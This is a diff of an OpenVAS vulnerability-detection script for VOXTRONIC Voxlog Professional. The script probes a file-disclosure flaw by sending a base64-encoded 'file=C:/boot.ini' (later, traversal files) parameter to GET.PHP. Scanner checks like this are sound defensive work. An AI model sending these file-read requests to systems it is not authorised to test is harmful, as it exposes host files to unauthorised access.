@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_voxtronic_voxlog_52081.nasl 11266 2018-09-06 10:59:26Z cfischer $
+# $Id: gb_voxtronic_voxlog_52081.nasl 12092 2018-10-25 11:43:33Z cfischer $
 #
 # VOXTRONIC Voxlog Professional Multiple Security Vulnerabilities
 #
@@ -29,24 +29,22 @@ if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.103430");
   script_bugtraq_id(52081);
-  script_version("$Revision: 11266 $");
+  script_version("$Revision: 12092 $");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-
   script_name("VOXTRONIC Voxlog Professional Multiple Security Vulnerabilities");
+  script_tag(name:"last_modification", value:"$Date: 2018-10-25 13:43:33 +0200 (Thu, 25 Oct 2018) $");
+  script_tag(name:"creation_date", value:"2012-02-20 14:56:07 +0100 (Mon, 20 Feb 2012)");
+  script_category(ACT_ATTACK);
+  script_family("Web application abuses");
+  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
+  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
+  script_require_ports("Services/www", 80);
+  script_exclude_keys("Settings/disable_cgi_scanning");
+  script_mandatory_keys("Host/runs_windows");
 
   script_xref(name:"URL", value:"http://www.securityfocus.com/bid/52081");
   script_xref(name:"URL", value:"http://www.voxtronic.com/");
-
-  script_tag(name:"last_modification", value:"$Date: 2018-09-06 12:59:26 +0200 (Thu, 06 Sep 2018) $");
-  script_tag(name:"creation_date", value:"2012-02-20 14:56:07 +0100 (Mon, 20 Feb 2012)");
-  script_category(ACT_ATTACK);
-  script_tag(name:"qod_type", value:"remote_vul");
-  script_family("Web application abuses");
-  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
-  script_dependencies("find_service.nasl", "http_version.nasl");
-  script_require_ports("Services/www", 80);
-  script_exclude_keys("Settings/disable_cgi_scanning");
 
   script_tag(name:"summary", value:"VOXTRONIC Voxlog Professional is prone to a file-disclosure
   vulnerability and multiple SQL-injection vulnerabilities because it
@@ -64,31 +62,44 @@ if(description)
   Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the
   product or replace the product by another one.");
 
+  script_tag(name:"qod_type", value:"remote_vul");
   script_tag(name:"solution_type", value:"WillNotFix");
 
   exit(0);
 }
 
 include("http_func.inc");
-include("host_details.inc");
 include("http_keepalive.inc");
+include("host_details.inc");
+include("misc_func.inc");
 
-port = get_http_port(default:80);
-if(!can_host_php(port:port))exit(0);
+port = get_http_port( default:80 );
+if( ! can_host_php( port:port ) )
+  exit( 0 );
 
-foreach dir (make_list("/voxlog","/voxalert")) {
+files = traversal_files( "Windows" );
 
-  url = string(dir, "/oben.php");
+foreach dir( make_list( "/voxlog", "/voxalert" ) ) {
 
-  if(http_vuln_check(port:port, url:url,pattern:"<title>(voxLog|voxAlert)", usecache:TRUE)) {
+  url = dir + "/oben.php";
 
-    url = dir + "/GET.PHP?v=ZmlsZT1DOi9ib290LmluaQ=="; # file=C:/boot.ini
+  if( http_vuln_check( port:port, url:url, pattern:"<title>(voxLog|voxAlert)", usecache:TRUE ) ) {
 
-    if(http_vuln_check(port:port, url:url,pattern:"\[boot loader\]")) {
-      security_message(port:port);
-      exit(0);
+    foreach pattern( keys( files ) ) {
+
+      file = files[pattern];
+      file = "file=C:/" + file;
+      file = base64( str:file );
+
+      url = dir + "/GET.PHP?v=" + file;
+
+      if( http_vuln_check( port:port, url:url, pattern:pattern ) ) {
+        report = report_vuln_url( port:port, url:url );
+        security_message( port:port, data:report );
+        exit( 0 );
+      }
     }
   }
 }
 
-exit(0);
+exit( 0 );
